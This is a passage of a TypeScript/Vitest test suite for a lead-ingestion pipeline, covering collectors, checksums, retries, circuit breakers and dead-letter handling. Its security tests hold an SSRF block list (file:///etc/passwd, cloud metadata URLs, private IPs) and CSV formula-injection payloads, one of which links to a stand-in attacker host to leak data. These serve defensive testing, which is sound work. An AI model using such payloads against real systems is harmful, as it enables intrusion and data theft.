import { NextRequest } from 'next/server';
import { beforeAll, describe, expect, it } from 'vitest';
import { createSessionToken, SESSION_COOKIE_NAME } from '../src/lib/auth';
import { ensureDbReady, prisma } from '../src/lib/db';
import { seedDatabase } from '../src/lib/seed-data';
import { getSourceAnalytics } from '../src/lib/analytics';
import { withIdentityConcurrencyLock } from '../src/lib/deduplication';
import { validateAndNormalizeLead } from '../src/lib/validator';
import {
  INGESTION_CONTRACT_V1,
  IngestionError,
  CollectorRegistry,
  collectorRegistry,
  ManualCollector,
  CsvCollector,
  OpenDataCollector,
  DirectoryCollector,
  WebsiteCollector,
  GoogleBusinessCollector,
  validateCollectorContractRecord,
  calculateIngestionChecksum,
  validateSafeExternalUrl,
  assertSafeExternalUrl,
  safeExternalFetch,
  sanitizeSpreadsheetFormula,
  validateAndParseSafeCsv,
  sanitizeRawPayloadForStorage,
  maskSourceConfigSecrets,
  classifyIngestionError,
  computeExponentialBackoffMs,
  executeWithRetry,
  SourceRateLimiter,
  evaluateCircuitBreakerBeforeRun,
  recordCircuitBreakerOutcome,
  acquireSourceJobLock,
  releaseSourceJobLock,
  runIngestionPipeline,
  cancelIngestionJob,
  resumeIngestionJob,
  runMultipleSourcesIsolated,
  handleDeadLetterAction,
  runBackfillOrReprocess,
  getLeadDataLineage,
  applyIngestionRetentionPolicy,
  determineDeterministicHealthStatus,
  getIngestionHealthOverview,
  evaluateOperationalAlerts,
  computeNextRunAt,
  evaluateScheduledSources,
  DEFAULT_INVENTORY_TARGETS,
  evaluateInventoryReplenishment,
  computeSourceCostEconomics,
} from '../src/lib/collectors';

// Phase 8 Admin Ingestion Route Handlers
import {
  GET as getIngestionSourcesRoute,
  POST as postIngestionSourcesRoute,
} from '../src/app/api/admin/ingestion/sources/route';
import {
  GET as getIngestionSourceDetailRoute,
  PATCH as patchIngestionSourceDetailRoute,
} from '../src/app/api/admin/ingestion/sources/[sourceId]/route';
import { POST as postRunIngestionSourceRoute } from '../src/app/api/admin/ingestion/sources/[sourceId]/run/route';
import { GET as getIngestionJobsRoute } from '../src/app/api/admin/ingestion/jobs/route';
import { GET as getIngestionJobDetailRoute } from '../src/app/api/admin/ingestion/jobs/[jobId]/route';
import { GET as getDeadLetterRoute } from '../src/app/api/admin/ingestion/dead-letter/route';
import {
  GET as getIngestionHealthRoute,
  POST as postIngestionHealthRoute,
} from '../src/app/api/admin/ingestion/health/route';

function makeAuthRequest(
  url: string,
  method: string,
  token?: string,
  body?: Record<string, unknown>,
  customOrigin?: string
): NextRequest {
  const headers: Record<string, string> = {
    host: 'localhost:3000',
    origin: customOrigin ?? 'http://localhost:3000',
    ...(token ? { cookie: `${SESSION_COOKIE_NAME}=${token}` } : {}),
    ...(body ? { 'content-type': 'application/json' } : {}),
  };

  return new NextRequest(url, {
    method,
    headers,
    body: body ? JSON.stringify(body) : undefined,
  });
}

describe('Phase 8 — Production-Grade Ingestion + Collector Architecture + Continuous Lead Supply', () => {
  let adminToken: string;
  let developerToken: string;
  let adminUserId: string;

  beforeAll(async () => {
    await ensureDbReady();
    await seedDatabase(prisma);

    const adminUser = await prisma.user.findFirstOrThrow({
      where: { role: 'ADMIN' },
    });
    const devUser = await prisma.user.findFirstOrThrow({
      where: { role: 'DEVELOPER' },
      include: { developerProfile: true },
    });

    adminUserId = adminUser.id;
    adminToken = await createSessionToken({
      id: adminUser.id,
      email: adminUser.email,
      name: adminUser.name,
      role: 'ADMIN',
    });
    developerToken = await createSessionToken({
      id: devUser.id,
      email: devUser.email,
      name: devUser.name,
      role: 'DEVELOPER',
    });
  }, 60000);

  describe('1. Collector Architecture, Versioned Registry, Unified Contract & SHA-256 Checksum', () => {
    it('registers all 6 standard versioned collectors in CollectorRegistry with capabilities', () => {
      const metadata = collectorRegistry.listMetadata();
      expect(metadata.length).toBeGreaterThanOrEqual(6);

      const types = metadata.map((m) => m.sourceType);
      expect(types).toContain('MANUAL');
      expect(types).toContain('CSV_IMPORT');
      expect(types).toContain('OPEN_DATA');
      expect(types).toContain('DIRECTORY');
      expect(types).toContain('WEBSITE');
      expect(types).toContain('GOOGLE_BUSINESS');

      for (const item of metadata) {
        expect(item.contractVersion).toBe(INGESTION_CONTRACT_V1);
        expect(item.version).toMatch(/-v1$/);
      }

      // Resolve by type and explicit version key
      const csvCollector = collectorRegistry.resolveCollector({
        collectorKey: 'csv-v1',
        sourceType: 'CSV_IMPORT',
      });
      expect(csvCollector.collectorKey).toBe('csv');
      expect(csvCollector.version).toBe('csv-v1');

      // Empty registry rejects unregistered collector lookup deterministically
      const emptyRegistry = new CollectorRegistry(false);
      expect(() => emptyRegistry.get('MANUAL')).toThrowError(/No collector registered/);
    });

    it('validates unified contract records and computes deterministic SHA-256 content checksums', () => {
      const leadInput = {
        name: 'عيادة النور التخصصية',
        businessName: 'عيادة النور التخصصية',
        phone: '01012345678',
        email: 'info@alnour-clinic.eg',
        website: 'https://alnour-clinic.eg',
        facebook: 'https://facebook.com/alnourclinic',
        address: 'شارع التسعين، التجمع الخامس',
        city: 'القاهرة',
        area: 'التجمع الخامس',
        governorate: 'القاهرة',
        category: 'Medical',
        source: 'Egyptian Business Directory',
        sourceType: 'DIRECTORY',
        externalId: 'ext-100',
      };

      const checksum1 = calculateIngestionChecksum(leadInput);
      const checksum2 = calculateIngestionChecksum({
        ...leadInput,
        // Unstable fields or whitespace differences do not alter the canonical content checksum
        businessName: '  عيادة النور التخصصية  ',
      });
      expect(checksum1).toHaveLength(64);
      expect(checksum1).toBe(checksum2);

      // Changing a material field (phone or businessName) changes the checksum
      const checksumChanged = calculateIngestionChecksum({
        ...leadInput,
        phone: '01099998888',
      });
      expect(checksumChanged).not.toBe(checksum1);

      const validContractRecord = {
        contractVersion: INGESTION_CONTRACT_V1,
        sourceType: 'DIRECTORY' as const,
        sourceName: 'Egyptian Business Directory',
        collectorVersion: 'directory-v1',
        externalId: 'ext-100',
        fetchedAt: new Date().toISOString(),
        checksum: checksum1,
        rawPayload: { listing_id: 'ext-100', title: 'عيادة النور التخصصية' },
        leadInput,
      };

      const validation = validateCollectorContractRecord(validContractRecord);
      expect(validation.valid).toBe(true);
      expect(validation.record).toBeDefined();

      // Invalid contract record fails validation
      const invalidValidation = validateCollectorContractRecord({
        ...validContractRecord,
        sourceName: '',
      });
      expect(invalidValidation.valid).toBe(false);
      expect(invalidValidation.errors.length).toBeGreaterThan(0);

      // requireExternalId option enforces non-empty externalId
      const missingExtValidation = validateCollectorContractRecord(
        { ...validContractRecord, externalId: null },
        { requireExternalId: true }
      );
      expect(missingExtValidation.valid).toBe(false);
    });

    it('isolates adapters from collectors across all 6 source types and enforces GoogleBusiness NOT_CONFIGURED policy', async () => {
      // 1. ManualCollector
      const manualCol = new ManualCollector();
      const manualNormalized = manualCol.normalize({
        businessName: 'شركة الأهرام العقارية',
        phone: '01011223344',
        city: 'القاهرة',
        category: 'Real Estate',
      });
      expect(manualNormalized.collectorVersion).toBe('manual-v1');
      expect(manualNormalized.sourceType).toBe('MANUAL');

      // 2. CsvCollector
      const csvCol = new CsvCollector();
      const csvContent = [
        'businessName,phone,city,category,website',
        'عيادة الشفاء,01122334455,الجيزة,Medical,https://shifa.example.eg',
      ].join('\n');
      const csvItems = await csvCol.collect(csvContent);
      expect(csvItems).toHaveLength(1);
      expect(csvItems[0].businessName).toBe('عيادة الشفاء');
      const csvContract = csvCol.normalize(csvItems[0]);
      expect(csvContract.collectorVersion).toBe('csv-v1');

      // 3. OpenDataCollector
      const openDataCol = new OpenDataCollector();
      const openContract = openDataCol.normalize({
        registry_id: 'OD-501',
        commercial_name: 'معمل المختبر الحديث',
        contact_phone: '01233445566',
        governorate: 'الإسكندرية',
        activity_category: 'Medical',
      });
      expect(openContract.collectorVersion).toBe('open-data-v1');
      expect(openContract.externalId).toBe('OD-501');

      // 4. DirectoryCollector
      const dirCol = new DirectoryCollector();
      const dirContract = dirCol.normalize({
        listing_id: 'DIR-77',
        company_title: 'أكاديمية المستقبل للتدريب',
        tel: '01555667788',
        city_name: 'القاهرة',
        sector: 'Education',
      });
      expect(dirContract.collectorVersion).toBe('directory-v1');
      expect(dirContract.externalId).toBe('DIR-77');

      // 5. WebsiteCollector
      const webCol = new WebsiteCollector();
      const webContract = webCol.normalize({
        businessName: 'مطعم النيل الذهبي',
        phone: '01066778899',
        website: 'https://golden-nile.example.eg',
        city: 'القاهرة',
        category: 'Restaurant',
      });
      expect(webContract.collectorVersion).toBe('website-v1');

      // 6. GoogleBusinessCollector — must report NOT_CONFIGURED when GOOGLE_PLACES_API_KEY is absent and no exportRecords provided
      const savedEnvKey = process.env.GOOGLE_PLACES_API_KEY;
      delete process.env.GOOGLE_PLACES_API_KEY;
      try {
        const gmbCol = new GoogleBusinessCollector();
        const gmbConfigCheck = gmbCol.validateConfiguration({});
        expect(gmbConfigCheck.valid).toBe(false);
        expect(gmbConfigCheck.status).toBe('NOT_CONFIGURED');

        await expect(
          gmbCol.discover({
            sourceName: 'Google Business Profile Connector',
            config: {},
          })
        ).rejects.toMatchObject({
          code: 'INVALID_SOURCE_CONFIGURATION',
        });
      } finally {
        if (savedEnvKey !== undefined) {
          process.env.GOOGLE_PLACES_API_KEY = savedEnvKey;
        }
      }
    });
  });

  describe('2. Security Hardening: SSRF Protection, CSV Formula Injection & Privacy Redaction', () => {
    it('blocks localhost, loopback, private IPv4/IPv6 ranges, cloud metadata endpoints, and non-HTTP schemes', () => {
      const blockedUrls = [
        'http://localhost:3000/api/admin',
        'http://127.0.0.1:8080/internal',
        'http://0.0.0.0/',
        'http://10.0.0.5/secret',
        'http://172.16.0.1/admin',
        'http://172.31.255.255/config',
        'http://192.168.1.1/router',
        'http://169.254.169.254/latest/meta-data/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://[::1]:3000/',
        'http://[fe80::1]/',
        'http://[fc00::1]/',
        'file:///etc/passwd',
        'ftp://files.example.com/leads.csv',
        'javascript:alert(1)',
        'https://user:pass@example.com/private',
        'http://internal.local/test',
      ];

      for (const unsafeUrl of blockedUrls) {
        const check = validateSafeExternalUrl(unsafeUrl);
        expect(check.valid).toBe(false);
        expect(() => assertSafeExternalUrl(unsafeUrl)).toThrowError(IngestionError);
      }

      const safeUrls = [
        'https://alnour-clinic.com.eg/about',
        'https://www.yellowpages.com.eg/ar/category/clinics',
      ];
      for (const safeUrl of safeUrls) {
        const check = validateSafeExternalUrl(safeUrl);
        expect(check.valid).toBe(true);
      }
    });

    it('validates redirect hops in safeExternalFetch against SSRF targets', async () => {
      let callCount = 0;
      const mockFetch: typeof fetch = async () => {
        callCount++;
        return new Response(null, {
          status: 302,
          headers: {
            location: 'http://169.254.169.254/latest/meta-data/',
          },
        });
      };

      await expect(
        safeExternalFetch('https://public-site.example.com/start', {
          fetchImpl: mockFetch,
        })
      ).rejects.toMatchObject({
        code: 'SSRF_BLOCKED',
      });
      expect(callCount).toBe(1);
    });

    it('neutralizes CSV spreadsheet formula injection payloads and enforces byte/row/column limits', () => {
      // Formula triggers (=, +, -, @) are stripped from leading position while preserving valid phone numbers
      expect(sanitizeSpreadsheetFormula("=cmd|'/C calc'!A0")).toBe("cmd|'/C calc'!A0");
      expect(sanitizeSpreadsheetFormula('+SUM(A1:A10)')).toBe('SUM(A1:A10)');
      expect(sanitizeSpreadsheetFormula('-2+3+cmd')).toBe('2+3+cmd');
      expect(sanitizeSpreadsheetFormula('@SUM(1+1)')).toBe('SUM(1+1)');
      // Standard phone numbers like +201012345678 must NOT be corrupted!
      expect(sanitizeSpreadsheetFormula('+201012345678')).toBe('+201012345678');

      const maliciousCsv = [
        'businessName,phone,city,category',
        '=HYPERLINK("http://attacker.example/leak"),+201012345678,القاهرة,Medical',
      ].join('\n');

      const parsed = validateAndParseSafeCsv(maliciousCsv);
      expect(parsed.rows).toHaveLength(1);
      expect(parsed.rows[0].businessName.startsWith('=')).toBe(false);
      expect(parsed.rows[0].phone).toBe('+201012345678');

      // Enforce maxBytes quota
      expect(() =>
        validateAndParseSafeCsv(maliciousCsv, { maxBytes: 10 })
      ).toThrowError(/exceeds maximum allowed limit/);

      // Enforce maxRows quota
      const manyRowsCsv = [
        'businessName,phone',
        'Biz 1,01011111111',
        'Biz 2,01022222222',
        'Biz 3,01033333333',
      ].join('\n');
      expect(() =>
        validateAndParseSafeCsv(manyRowsCsv, { maxRows: 2 })
      ).toThrowError(/exceeds maximum allowed per import/);
    });

    it('redacts sensitive secrets and drops unnecessary private personal fields from raw payloads and source configs', () => {
      const dirtyPayload = {
        businessName: 'عيادة الأمل',
        phone: '01012345678',
        apiKey: 'sk-live-999999999',
        nationalId: '29001011234567',
        homeAddress: 'شقة 5 عقار 10',
        nested: {
          authorization: 'Bearer secret-jwt',
          publicEmail: 'contact@amal.eg',
        },
      };

      const sanitized = sanitizeRawPayloadForStorage(dirtyPayload);
      expect(sanitized.businessName).toBe('عيادة الأمل');
      expect(sanitized.apiKey).toBe('[REDACTED]');
      expect(sanitized.nationalId).toBeUndefined();
      expect(sanitized.homeAddress).toBeUndefined();
      expect((sanitized.nested as Record<string, unknown>).authorization).toBe(
        '[REDACTED]'
      );
      expect((sanitized.nested as Record<string, unknown>).publicEmail).toBe('contact@amal.eg');

      const maskedConfig = maskSourceConfigSecrets({
        apiKey: 'AIzaSySecretKey123456',
        endpoint: 'https://places.googleapis.com',
      });
      expect(maskedConfig.apiKey).toBe('[REDACTED]');
      expect(maskedConfig.endpoint).toBe('https://places.googleapis.com');
    });
  });

  describe('3. Resilience: Retry Classifier, Exponential Backoff, Rate Limiter & Circuit Breaker', () => {
    it('classifies retryable vs non-retryable errors and executes bounded exponential backoff', async () => {
      const networkErr = new IngestionError('Socket timeout', 'SOURCE_TIMEOUT', {
        retryable: true,
      });
      expect(classifyIngestionError(networkErr).retryable).toBe(true);

      const validationErr = new IngestionError(
        'Missing business name',
        'INVALID_SOURCE_RECORD',
        { retryable: false }
      );
      expect(classifyIngestionError(validationErr).retryable).toBe(false);

      const policyErr = new IngestionError('CAPTCHA detected', 'POLICY_RESTRICTION', {
        retryable: false,
      });
      expect(classifyIngestionError(policyErr).retryable).toBe(false);

      // Exponential backoff is bounded by maxDelayMs
      const delay1 = computeExponentialBackoffMs(1, {
        maxRetries: 4,
        baseDelayMs: 100,
        maxDelayMs: 500,
        jitterFactor: 0,
      });
      const delay4 = computeExponentialBackoffMs(4, {
        maxRetries: 4,
        baseDelayMs: 100,
        maxDelayMs: 500,
        jitterFactor: 0,
      });
      expect(delay1).toBe(100);
      expect(delay4).toBe(500);

      // executeWithRetry succeeds on transient failure
      let attempts = 0;
      const retryResult = await executeWithRetry(
        async () => {
          attempts++;
          if (attempts < 3) {
            throw new IngestionError('Transient timeout', 'SOURCE_TIMEOUT', {
              retryable: true,
            });
          }
          return 'RECOVERED';
        },
        { policy: { maxRetries: 3, baseDelayMs: 5, maxDelayMs: 20, jitterFactor: 0 } }
      );
      expect(retryResult.result).toBe('RECOVERED');
      expect(retryResult.attempts).toBe(3);

      // executeWithRetry stops immediately on non-retryable error
      let nonRetryAttempts = 0;
      await expect(
        executeWithRetry(
          async () => {
            nonRetryAttempts++;
            throw new IngestionError('Blocked', 'SSRF_BLOCKED', { retryable: false });
          },
          { policy: { maxRetries: 4, baseDelayMs: 5, maxDelayMs: 20, jitterFactor: 0 } }
        )
      ).rejects.toMatchObject({ code: 'SSRF_BLOCKED' });
      expect(nonRetryAttempts).toBe(1);
    });

    it('transitions Circuit Breaker states deterministically: CLOSED -> OPEN -> HALF_OPEN -> CLOSED', () => {
      const cbConfig = {
        failureThreshold: 3,
        cooldownMs: 60000,
      };
      const t0 = new Date('2026-10-08T10:00:00.000Z');

      const initialSnapshot = {
        state: 'CLOSED' as const,
        consecutiveFailures: 0,
        circuitOpenedAt: null,
      };

      // 1st failure -> still CLOSED
      const after1 = recordCircuitBreakerOutcome(initialSnapshot, false, cbConfig, t0);
      expect(after1.state).toBe('CLOSED');
      expect(after1.consecutiveFailures).toBe(1);

      // 2nd failure -> still CLOSED
      const after2 = recordCircuitBreakerOutcome(after1, false, cbConfig, t0);
      expect(after2.state).toBe('CLOSED');
      expect(after2.consecutiveFailures).toBe(2);

      // 3rd failure -> trips to OPEN
      const after3 = recordCircuitBreakerOutcome(after2, false, cbConfig, t0);
      expect(after3.state).toBe('OPEN');
      expect(after3.consecutiveFailures).toBe(3);
      expect(after3.circuitOpenedAt?.toISOString()).toBe(t0.toISOString());

      // While inside cooldown window -> blocked
      const duringCooldown = new Date('2026-10-08T10:00:30.000Z');
      const evalDuring = evaluateCircuitBreakerBeforeRun(after3, cbConfig, duringCooldown);
      expect(evalDuring.allowed).toBe(false);
      expect(evalDuring.nextState).toBe('OPEN');

      // After cooldown expires -> transitions to HALF_OPEN and allows probe run
      const afterCooldown = new Date('2026-10-08T10:01:05.000Z');
      const evalAfter = evaluateCircuitBreakerBeforeRun(after3, cbConfig, afterCooldown);
      expect(evalAfter.allowed).toBe(true);
      expect(evalAfter.nextState).toBe('HALF_OPEN');

      // Probe succeeds -> resets to CLOSED with 0 failures
      const afterRecovery = recordCircuitBreakerOutcome(
        { ...after3, state: 'HALF_OPEN' },
        true,
        cbConfig,
        afterCooldown
      );
      expect(afterRecovery.state).toBe('CLOSED');
      expect(afterRecovery.consecutiveFailures).toBe(0);
    });

    it('enforces per-source rate limiting and source/identity concurrency locks', async () => {
      SourceRateLimiter.resetForTesting();
      const slot1 = SourceRateLimiter.acquireSlot('rate-test-src', {
        requestsPerMinute: 2,
        maxConcurrentRequests: 1,
      });
      expect(slot1.allowed).toBe(true);

      // Second concurrent slot blocked when maxConcurrentRequests = 1
      const slot2 = SourceRateLimiter.acquireSlot('rate-test-src', {
        requestsPerMinute: 2,
        maxConcurrentRequests: 1,
      });
      expect(slot2.allowed).toBe(false);

      SourceRateLimiter.releaseSlot('rate-test-src');
      const slot3 = SourceRateLimiter.acquireSlot('rate-test-src', {
        requestsPerMinute: 2,
        maxConcurrentRequests: 1,
      });
      expect(slot3.allowed).toBe(true);
      SourceRateLimiter.releaseSlot('rate-test-src');

      // Source job lock prevents concurrent jobs on the same source
      const lockSrcId = 'lock-test-source-id';
      expect(acquireSourceJobLock(lockSrcId, 'job-1')).toBe(true);
      expect(acquireSourceJobLock(lockSrcId, 'job-1')).toBe(true); // re-entrant for same jobId
      expect(acquireSourceJobLock(lockSrcId, 'job-2')).toBe(false); // blocked for different jobId
      releaseSourceJobLock(lockSrcId, 'job-1');
      expect(acquireSourceJobLock(lockSrcId, 'job-2')).toBe(true);
      releaseSourceJobLock(lockSrcId, 'job-2');

      // Identity concurrency lock serializes concurrent mutations on the same phone/identity key
      const order: number[] = [];
      await Promise.all([
        withIdentityConcurrencyLock(['PHONE:01055556666'], async () => {
          await new Promise((r) => setTimeout(r, 15));
          order.push(1);
        }),
        withIdentityConcurrencyLock(['PHONE:01055556666'], async () => {
          order.push(2);
        }),
      ]);
      expect(order).toEqual([1, 2]);
    });
  });

  describe('4. Full End-to-End Orchestrator Pipeline, Idempotency, Checkpoints, Cancellation & DLQ', () => {
    let testSourceId: string;
    const testSourceName = 'Phase 8 Test Directory Source';

    beforeAll(async () => {
      const existing = await prisma.leadSource.findUnique({
        where: { name: testSourceName },
      });
      if (existing) {
        testSourceId = existing.id;
      } else {
        const source = await prisma.leadSource.create({
          data: {
            name: testSourceName,
            type: 'DIRECTORY',
            isActive: true,
            enabled: true,
            collectorKey: 'directory',
            collectorVersion: 'directory-v1',
            healthStatus: 'HEALTHY',
            configurationStatus: 'CONFIGURED',
            requestsPerMinute: 600,
            acquisitionCostPerRunEgp: 50,
            acquisitionCostPerRecordEgp: 2,
          },
        });
        testSourceId = source.id;
      }
    });

    it('runs end-to-end ingestion across Phases 1-4 and guarantees idempotency on repeated runs', async () => {
      const rand8 = String(10000000 + Math.floor(Math.random() * 89999999));
      const rand8b = String(10000000 + Math.floor(Math.random() * 89999999));
      const uniquePhone1 = `010${rand8}`;
      const uniquePhone2 = `011${rand8b}`;

      const batchRecords = [
        {
          externalId: `P8-DIR-101-${rand8}`,
          businessName: `عيادة المستقبل التخصصية ${rand8}`,
          phone: uniquePhone1,
          email: `contact-${rand8}@future-dental-p8.eg`,
          website: `https://future-dental-${rand8}.eg`,
          address: 'شارع عباس العقاد، مدينة نصر',
          city: 'القاهرة',
          area: 'مدينة نصر',
          category: 'Medical',
        },
        {
          externalId: `P8-DIR-102-${rand8b}`,
          businessName: `شركة الرواد للتطوير العقاري ${rand8b}`,
          phone: uniquePhone2,
          email: `sales-${rand8b}@alrowad-realestate-p8.eg`,
          address: 'الحي المتميز، الشيخ زايد',
          city: 'الجيزة',
          area: 'الشيخ زايد',
          category: 'Real Estate',
        },
      ];

      // First run: creates canonical leads, computes quality (Phase 3), score (Phase 1), and invalidates matching (Phase 4)
      const run1 = await runIngestionPipeline({
        prisma,
        userId: adminUserId,
        sourceId: testSourceId,
        sourceName: testSourceName,
        sourceType: 'DIRECTORY',
        triggerType: 'MANUAL',
        idempotencyKey: `idem-p8-batch-${Date.now()}`,
        rawRecords: batchRecords,
      });

      expect(run1.status).toBe('COMPLETED');
      expect(run1.imported).toBe(2);
      expect(run1.valid).toBe(2);
      expect(run1.deadLetters).toBe(0);

      // Re-running with the exact same idempotencyKey returns the existing completed job without duplicating work
      const runSameIdem = await runIngestionPipeline({
        prisma,
        userId: adminUserId,
        sourceId: testSourceId,
        sourceName: testSourceName,
        sourceType: 'DIRECTORY',
        triggerType: 'MANUAL',
        idempotencyKey: (await prisma.importJob.findUniqueOrThrow({ where: { id: run1.importJobId } }))
          .idempotencyKey!,
        rawRecords: batchRecords,
      });
      expect(runSameIdem.importJobId).toBe(run1.importJobId);

      // Re-running the same records under a new job hits the SHA-256 checksum fast-path or deduplication without creating new leads
      const run2 = await runIngestionPipeline({
        prisma,
        userId: adminUserId,
        sourceId: testSourceId,
        sourceName: testSourceName,
        sourceType: 'DIRECTORY',
        triggerType: 'MANUAL',
        rawRecords: batchRecords,
      });
      expect(run2.status).toBe('COMPLETED');
      expect(run2.inserted).toBe(0);
      expect(run2.duplicates).toBe(2);
      expect(run2.skipped).toBe(2);

      // Verify canonical lead has Phase 1 score, Phase 2 provenance, Phase 3 quality, and full lineage
      const createdLead = await prisma.lead.findFirstOrThrow({
        where: { phone: uniquePhone1, isCanonical: true },
      });
      expect(createdLead.score).toBeGreaterThan(0);
      expect(createdLead.qualityScore).toBeGreaterThan(0);

      const lineage = await getLeadDataLineage(prisma, createdLead.id);
      expect(lineage.leadId).toBe(createdLead.id);
      expect(lineage.observations.length).toBeGreaterThanOrEqual(1);
      expect(lineage.observations[0].collectorVersion).toBe('directory-v1');
      expect(lineage.observations[0].checksum).toHaveLength(64);
    });

    it('supports checkpointing, crash simulation, and resuming from the exact checkpoint without duplicating prior records', async () => {
      const crashRecords = [
        {
          externalId: 'P8-CRASH-1',
          businessName: 'مركز النيل الطبي 1',
          phone: '01077110001',
          city: 'القاهرة',
          category: 'Medical',
        },
        {
          externalId: 'P8-CRASH-2',
          businessName: 'مركز النيل الطبي 2',
          phone: '01077110002',
          city: 'القاهرة',
          category: 'Medical',
        },
        {
          externalId: 'P8-CRASH-3',
          businessName: 'مركز النيل الطبي 3',
          phone: '01077110003',
          city: 'القاهرة',
          category: 'Medical',
        },
        {
          externalId: 'P8-CRASH-4',
          businessName: 'مركز النيل الطبي 4',
          phone: '01077110004',
          city: 'القاهرة',
          category: 'Medical',
        },
      ];

      // Simulate crash after 2 records
      await expect(
        runIngestionPipeline({
          prisma,
          userId: adminUserId,
          sourceId: testSourceId,
          sourceName: testSourceName,
          sourceType: 'DIRECTORY',
          triggerType: 'MANUAL',
          batchSize: 1,
          simulateCrashAfterCount: 2,
          rawRecords: crashRecords,
        })
      ).rejects.toThrowError(/Simulated crash/);

      const failedJob = await prisma.importJob.findFirstOrThrow({
        where: { sourceId: testSourceId, status: 'FAILED' },
        orderBy: { createdAt: 'desc' },
      });

      const cp = failedJob.checkpoint as Record<string, unknown>;
      expect(cp.processedCount).toBe(2);

      // Now resume the crashed job from its checkpoint
      const resumed = await resumeIngestionJob({
        prisma,
        jobId: failedJob.id,
        userId: adminUserId,
        rawRecords: crashRecords,
      });
      expect(resumed.status).toBe('COMPLETED');
      expect(resumed.imported).toBe(4);
    });

    it('supports cooperative job cancellation via cancelIngestionJob', async () => {
      const runningJob = await prisma.importJob.create({
        data: {
          userId: adminUserId,
          sourceId: testSourceId,
          sourceName: testSourceName,
          fileName: 'cancel-test.json',
          status: 'RUNNING',
          collectorVersion: 'directory-v1',
          contractVersion: INGESTION_CONTRACT_V1,
          triggerType: 'MANUAL',
        },
      });

      const cancelledJob = await cancelIngestionJob({
        prisma,
        jobId: runningJob.id,
        adminUserId,
        reason: 'Unit test cancellation',
      });
      expect(cancelledJob.status).toBe('CANCELLED');
      expect(cancelledJob.cancelledAt).not.toBeNull();
    });

    it('routes invalid records to DeadLetterRecord and supports RETRY -> RETRIED_RESOLVED and MARK_INVALID -> PERMANENTLY_INVALID', async () => {
      const dlqRand = String(10000000 + Math.floor(Math.random() * 89999999));
      const dlqRetryRand = String(10000000 + Math.floor(Math.random() * 89999999));
      // Ingest a batch with 1 valid record and 2 invalid records (missing business name / contact)
      const mixedBatch = [
        {
          externalId: `P8-DLQ-VALID-${dlqRand}`,
          businessName: `عيادة دار الفؤاد التخصصية ${dlqRand}`,
          phone: `010${dlqRand}`,
          city: 'القاهرة',
          category: 'Medical',
        },
        {
          externalId: `P8-DLQ-BAD-1-${dlqRand}`,
          businessName: '', // Invalid: empty businessName
          phone: 'invalid-phone',
        },
        {
          externalId: `P8-DLQ-BAD-2-${dlqRand}`,
          businessName: '', // Invalid
          phone: 'bad',
        },
      ];

      const res = await runIngestionPipeline({
        prisma,
        userId: adminUserId,
        sourceId: testSourceId,
        sourceName: testSourceName,
        sourceType: 'DIRECTORY',
        triggerType: 'MANUAL',
        rawRecords: mixedBatch,
      });

      expect(res.valid).toBe(1);
      expect(res.invalid).toBe(2);
      expect(res.deadLetters).toBe(2);

      const dlqItems = await prisma.deadLetterRecord.findMany({
        where: { importJobId: res.importJobId, status: 'DEAD_LETTER' },
        orderBy: { createdAt: 'asc' },
      });
      expect(dlqItems).toHaveLength(2);

      // 1. Supply overridePayload on dlqItems[0] and RETRY it -> RETRIED_RESOLVED
      const retryRes = await handleDeadLetterAction({
        prisma,
        deadLetterId: dlqItems[0].id,
        adminUserId,
        action: 'RETRY',
        overridePayload: {
          externalId: `P8-DLQ-BAD-1-${dlqRand}`,
          businessName: `شركة تم استكمال بياناتها بنجاح ${dlqRetryRand}`,
          phone: `012${dlqRetryRand}`,
          city: 'القاهرة',
          category: 'Medical',
        },
        notes: 'Fixed missing business name and phone number',
      });
      expect(retryRes.success).toBe(true);
      expect(retryRes.deadLetter.status).toBe('RETRIED_RESOLVED');
      expect(retryRes.deadLetter.resolvedLeadId).toBeTruthy();

      // 2. Mark dlqItems[1] as PERMANENTLY_INVALID and verify subsequent retry is blocked
      const markInvalidRes = await handleDeadLetterAction({
        prisma,
        deadLetterId: dlqItems[1].id,
        adminUserId,
        action: 'MARK_INVALID',
        notes: 'Confirmed permanently unusable record',
      });
      expect(markInvalidRes.deadLetter.status).toBe('PERMANENTLY_INVALID');

      await expect(
        handleDeadLetterAction({
          prisma,
          deadLetterId: dlqItems[1].id,
          adminUserId,
          action: 'RETRY',
        })
      ).rejects.toMatchObject({
        code: 'POLICY_RESTRICTION',
      });
    });

    it('isolates failures across multiple sources in runMultipleSourcesIsolated', async () => {
      const savedEnvKey = process.env.GOOGLE_PLACES_API_KEY;
      delete process.env.GOOGLE_PLACES_API_KEY;

      try {
        const unconfiguredGmbName = `Unconfigured GMB Test Source ${Date.now()}`;
        const unconfiguredGmb = await prisma.leadSource.create({
          data: {
            name: unconfiguredGmbName,
            type: 'GOOGLE_BUSINESS',
            isActive: true,
            enabled: true,
            collectorKey: 'google-business',
            collectorVersion: 'google-business-v1',
            healthStatus: 'NOT_CONFIGURED',
            configurationStatus: 'NOT_CONFIGURED',
          },
        });

        const multiResults = await runMultipleSourcesIsolated({
          prisma,
          userId: adminUserId,
          runs: [
            {
              sourceId: unconfiguredGmb.id,
              sourceName: unconfiguredGmb.name,
              sourceType: 'GOOGLE_BUSINESS',
            },
            {
              sourceId: testSourceId,
              sourceName: testSourceName,
              sourceType: 'DIRECTORY',
              rawRecords: [
                {
                  externalId: 'P8-ISOLATED-OK',
                  businessName: 'معمل البرج للتحاليل الطبية',
                  phone: '01288990011',
                  city: 'القاهرة',
                  category: 'Medical',
                },
              ],
            },
          ],
        });

        expect(multiResults.totalSources).toBe(2);
        expect(multiResults.succeededCount).toBe(1);
        expect(multiResults.failedCount).toBe(1);

        const gmbOutcome = multiResults.results.find(
          (r) => r.sourceName === unconfiguredGmbName
        )!;
        const dirOutcome = multiResults.results.find(
          (r) => r.sourceName === testSourceName
        )!;

        expect(gmbOutcome.status).toBe('FAILED');
        expect(gmbOutcome.errorCode).toBe('INVALID_SOURCE_CONFIGURATION');

        expect(dirOutcome.status).toBe('SUCCEEDED');
        expect(dirOutcome.report?.status).toBe('COMPLETED');
      } finally {
        if (savedEnvKey !== undefined) {
          process.env.GOOGLE_PLACES_API_KEY = savedEnvKey;
        }
      }
    });

    it('supports targeted backfill/reprocess and data retention cleanup', async () => {
      const startDate = new Date(Date.now() - 7 * 24 * 3600_000);
      const endDate = new Date(Date.now() + 3600_000);

      const reprocessReport = await runBackfillOrReprocess({
        prisma,
        adminUserId,
        sourceId: testSourceId,
        sourceName: testSourceName,
        startDate,
        endDate,
        maxRecords: 5,
        forceReprocess: true,
      });
      expect(reprocessReport.status).toBe('COMPLETED');

